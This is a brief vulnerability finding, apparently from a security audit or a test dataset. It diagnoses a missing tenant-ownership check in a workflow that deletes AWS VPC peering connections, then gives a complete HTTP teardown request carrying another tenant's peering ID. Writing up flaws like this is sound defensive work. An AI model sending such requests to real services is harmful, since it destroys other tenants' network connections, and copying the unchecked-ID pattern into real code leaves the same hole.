diagnosis: The infrastructure decommissioning activity deletes AWS VPC peering connections based solely on peeringConnectionId passed in workflow arguments. Because the activity performs no verification against the tenant's registered peering connections, a workflow initiated with another tenant's peering ID will tear down active cloud network connections between corporate VPCs.
exploit_request:
POST /api/workflows/cloud-network/teardown HTTP/1.1
Host: vpc.orchestrator.aws.io
Authorization: Bearer <tenant_token>
Content-Type: application/json

{"peeringConnectionId": "pcx-0123456789abcdef0", "tenantIdentifier": "tnt_dev_sandbox"}
